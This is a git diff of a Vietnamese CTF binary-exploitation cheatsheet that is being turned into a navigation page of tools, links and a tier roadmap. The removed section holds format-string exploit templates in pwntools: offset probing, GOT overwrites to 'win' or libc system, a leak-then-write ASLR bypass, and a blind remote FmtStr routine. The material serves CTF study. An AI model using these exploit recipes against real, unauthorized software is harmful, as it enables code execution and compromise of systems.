@@ -1,82 +1,64 @@
-# Cheatsheet — PWN
+# PWN — bản đồ (lane P1)
 
-> Lane P1. Khung theo tier trong README mục 2. Mỗi kỹ thuật ghi: *nhận diện → cách làm → gadget/lệnh → link exploit thật*.
+> **Trang điều hướng.** Mọi thứ pwn trong repo nằm rải rác nhiều chỗ — đây là nơi **tra ra đường**
+> thay vì phải nhớ. Cần gì bấm vào đó. Cuối trang là roadmap theo tier.
 
-**Công cụ:** pwntools, `cyclic`, ROPgadget/ropper/angrop, one_gadget, libc-database/libc.rip, GDB + pwndbg/gef, `checksec`, Ghidra/IDA.
+---
 
-> **Sổ tay tiện ích pwntools (packing/tubes/ELF/ROP/fmt/shellcode/context, ví dụ + bản làm tay): [`pwn/pwntools/`](pwn/pwntools/)**
+## 1. Sổ tay tra cứu (cheatsheets)
+
+| Cần gì | Mở |
+|--------|-----|
+| **Hàm tiện ích pwntools** (packing/tubes/ELF/ROP/fmt/shellcode/context + DynELF/libcdb/ret2csu/SROP/ret2dlresolve…) — có ví dụ mọi case **+ bản làm tay để so sánh** | [`pwn/pwntools/`](pwn/pwntools/) |
+| → "dùng hàm nào cho **dạng bài** nào" (bảng tra nhanh) | [`pwn/pwntools/README.md`](pwn/pwntools/README.md#dùng-gì-cho-dạng-bài-nào) |
+| **Wrapper tự viết của repo** (`from pwnld import *`: `start/GDB/set_*`, macro IO, `leak_*_p/s`, `fmtstr_pos` short/full/consumed) | [`pwn/pwntools/pwnld.md`](pwn/pwntools/pwnld.md) |
+| **Format string** chuyên sâu (cơ chế `%n`, biến tấu, template mọi tình huống, short-vs-full) | [`pwn/fmtstr.md`](pwn/fmtstr.md) |
+
+## 2. Công cụ trong repo
+
+| Công cụ | Vai trò | Đường dẫn |
+|---------|---------|-----------|
+| `pwnld.py` | lớp mỏng bọc pwntools; `python3 pwnld.py --help <topic>` | [`tools/pwnld.py`](../tools/pwnld.py) · [tham chiếu](pwn/pwntools/pwnld.md) |
+| `genscr` | sinh nhanh `exploit.py` (+symlink pwnld/pwnretry), mở nvim | [`tools/`](../tools/) · [README](../tools/README.md) |
+| `retry/` | chạy lại tới khi trúng (ASLR, partial overwrite, brute canary, race) — viết `attempt(i)` → `retry()`; template flag/shell/parallel | [`exploits/pwn/retry/`](../exploits/pwn/retry/) |
+| `shellcode/` | catalog shellcode đã test: `from shellcodes import SC` | [`exploits/pwn/shellcode/`](../exploits/pwn/shellcode/) |
+| **bản đồ phụ thuộc** (sửa mảnh nào phải động tới đâu) | khi nâng cấp tool | [`exploits/pwn/MAINTAINING.md`](../exploits/pwn/MAINTAINING.md) |
+
+## 3. Template & nơi để bài giải
+
+- **Template exploit farm** (in flag ra stdout, chuẩn A/D): [`templates/exploit_pwn.py`](../templates/exploit_pwn.py)
+- **Exploit đã giải** lưu vào: [`exploits/pwn/<tên>/`](../exploits/pwn/) · **Writeup**: [`writeups/pwn/`](../writeups/pwn/)
+- *(máy cá nhân, không push)* lộ trình luyện tập & bài tutorial: `local/labs/PWN-roadmap.md`, `local/refs/pwn/`
+
+## 4. Công cụ ngoài (nhớ sẵn vài lệnh)
 
 ```bash
-checksec ./bin
-cyclic 200 ; cyclic -l 0x6161...   # tìm offset
-ROPgadget --binary ./bin | grep 'pop rdi'
-one_gadget ./libc.so.6
+checksec ./bin                              # NX/PIE/canary/RELRO
+cyclic 200 ;  cyclic -l 0x6161616161616164  # tìm offset BOF
+ROPgadget --binary ./bin | grep 'pop rdi'   # (hoặc ropper, angrop)
+one_gadget ./libc.so.6                       # magic gadget execve(/bin/sh)
+seccomp-tools dump ./bin                     # xem filter trước khi làm ORW
 ```
+Thêm: GDB + pwndbg/gef, libc-database / libc.rip (nhận libc từ leak), Ghidra/IDA.
 
-**Bộ tiện ích trong repo** ([`exploits/pwn/`](../exploits/pwn/) — bản đồ phụ thuộc: [`MAINTAINING.md`](../exploits/pwn/MAINTAINING.md)):
-- [`retry/`](../exploits/pwn/retry/) — khung chạy lại tới khi trúng (ASLR, partial overwrite, brute canary, race). Viết `attempt(i)` rồi đưa cho `retry()`. Template: flag / shell / parallel.
-- [`shellcode/`](../exploits/pwn/shellcode/) — catalog shellcode đã test: `from shellcodes import SC`.
+---
 
-## T1 — Stack BOF (ret2win, ret2shellcode)
-## T2 — Format string (leak, GOT overwrite)
+## 5. Roadmap theo tier
 
-> **Chi tiết đầy đủ (cơ chế, biến tấu, template mọi tình huống, syntax pwnld): [`pwn/fmtstr.md`](pwn/fmtstr.md)**
+> Trần mục tiêu P1 = **Tier 4** (T5+ là stretch). Giải xong tier nào → dán snippet + link `exploits/pwn/<tên>/` vào đây.
 
-**Nhận diện:** chương trình gọi `printf(input)` không format → gửi `%p %p %p` thấy leak.
-Ghi được số tuỳ ý vào địa chỉ tuỳ ý (`%n`) = arbitrary write → đè GOT / return addr / biến cờ.
+| Tier | Chủ đề | Tra ở đâu |
+|------|--------|-----------|
+| **T1** | Stack BOF (ret2win, ret2shellcode) | [rop](pwn/pwntools/rop.md), [shellcode](pwn/pwntools/shellcode.md), [packing `cyclic/flat`](pwn/pwntools/packing.md) |
+| **T2** | Format string (leak, GOT overwrite) | **[fmtstr.md](pwn/fmtstr.md)** · [fmt](pwn/pwntools/fmt.md) · [pwnld `fmtstr_pos`](pwn/pwntools/pwnld.md) |
+| **T3** | ROP / NX (ret2libc/plt/syscall, ret2csu, stack pivot) | [rop](pwn/pwntools/rop.md), [ret2csu](pwn/pwntools/advanced.md) |
+| **T4** | Bypass mitigation (leak canary/PIE, **SROP**) | [rop SROP](pwn/pwntools/rop.md#srop--sigreturnframe), [retry (brute)](../exploits/pwn/retry/) |
+| **T5** | Shellcoding (ORW seccomp, alphanumeric) | [shellcode](pwn/pwntools/shellcode.md), [encoders](pwn/pwntools/advanced.md), [`shellcode/`](../exploits/pwn/shellcode/) |
+| **T6** | Heap intro (UAF, double free, tcache poisoning) | *(chưa có — điền khi giải)* |
+| **T7** | Heap trung cấp (fastbin dup, unsorted leak, large bin) | *(chưa có)* |
+| **T8** | Heap nâng cao (safe-linking, house of …) | *(chưa có)* |
+| **T9** | FILE / FSOP | *(chưa có)* |
+| **T10** | Hijack control-flow (exit handlers, largebin→write) | *(chưa có)* |
+| **T11+** | Kernel / misc (stretch) | *(chưa có)* |
 
-**Dò OFFSET** (chỉ số tham số stack = vị trí input của bạn):
-```python
-io.sendline(b"AAAABBBB" + b"|%p" * 10)      # đếm %p thứ mấy ra 0x4141...  -> offset
-io.sendline(b"AAAA|%6$p|%7$p|%8$p")          # hoặc positional cho nhanh (64-bit dùng 8 byte "AAAAAAAA")
-```
-
-**Cách làm — mặc định `fmtstr_payload` (đã biết offset):**
-```python
-# fmtstr_payload(offset, {addr: val}, numbwritten=0, write_size='byte')
-#  write_size='byte' (mặc định) -> %hhn, tránh in hàng tỉ ký tự; tự tính %c, tự chèn địa chỉ
-context.binary = exe = ELF('./chall', checksec=False)   # BẮT BUỘC để biết 32/64-bit
-payload = fmtstr_payload(OFFSET, {exe.got['puts']: exe.sym['win']})
-io.sendlineafter(b'> ', payload)
-```
-Templates:
-```python
-fmtstr_payload(OFF, {exe.got['exit']: exe.sym['win']})                    # GOT overwrite
-fmtstr_payload(OFF, {exe.got['puts']: exe.sym['win'], exe.sym['f']: 1})   # ghi nhiều cặp
-fmtstr_payload(OFF, {exe.got['p']: exe.sym['win'] & 0xffff}, write_size='short')  # partial
-fmtstr_payload(OFF, {exe.got['printf']: libc.sym['system']})             # sau khi leak libc
-```
-Leak-rồi-ghi (bypass PIE/ASLR, chương trình cho nhập 2 lần):
-```python
-io.sendlineafter(b'> ', b'%15$p'); leak = int(io.recvline(), 16)
-libc.address = leak - libc.sym['<hàm_leak>']
-io.sendlineafter(b'> ', fmtstr_payload(OFF, {exe.got['printf']: libc.sym['system']}))
-```
-
-**`FmtStr` — chỉ khi BLIND / chưa biết offset VÀ chương trình echo output** (tự brute offset):
-```python
-def send(p):
-    io = remote('host', 1337); io.sendlineafter(b'in: ', p)
-    d = io.recvall(); io.close(); return d          # PHẢI trả output để nó dò offset
-fmt = FmtStr(execute_fmt=send)                      # fmt.offset = offset tự dò
-fmt.write(exe.got['puts'], exe.sym['win']); fmt.write(exe.sym['flag'], 1)
-fmt.execute_writes()                                # gửi thật (gộp tối ưu)
-```
-
-**Chọn cái nào:** ~90% dùng `fmtstr_payload`. `FmtStr` chỉ cho blind-có-echo (không echo → nó không dò được).
-Partial overwrite xác suất (1/16, 1/256) → bọc trong [`retry/`](../exploits/pwn/retry/).
-**Bẫy:** ghi trúng rác = sai OFFSET (dò lại, đừng đoán); thiếu `context.binary` → sai độ rộng địa chỉ; kiểm chứng 1 lần dưới GDB (break trước `printf`).
-Ví dụ thật: [`FSB_Write_Using_n/exploit.py`](../../../../learn/pwnable/tutorial/fsb/FSB_Write_Using_n/exploit.py)
-
-## T3 — ROP bypass NX (ret2libc/plt/syscall, ret2csu, stack pivot)
-## T4 — Bypass mitigation (leak canary/PIE, SROP)
-## T5 — Shellcoding (ORW seccomp, alphanumeric)
-Kho shellcode đã test: [`exploits/pwn/shellcode/`](../exploits/pwn/shellcode/) — `from shellcodes import SC`. Chọn theo ràng buộc (độ dài / null / seccomp / NX) xem README ở đó. Seccomp: `seccomp-tools dump ./bin` trước.
-## T6 — Heap intro (UAF, double free, tcache poisoning)
-## T7 — Heap trung cấp (fastbin dup, unsorted leak, large bin)
-## T8 — Heap nâng cao (safe-linking, house of ...)
-## T9 — FILE/FSOP
-## T10 — Hijack control-flow (exit handlers, largebin→write)
-## T11+ — Kernel / misc (stretch)
-
-<!-- Mỗi lần giải xong 1 tier: dán snippet + link exploits/pwn/<tên>/ -->
+<!-- Giải xong 1 tier: thêm dòng link exploits/pwn/<tên>/ vào cột "Tra ở đâu" -->
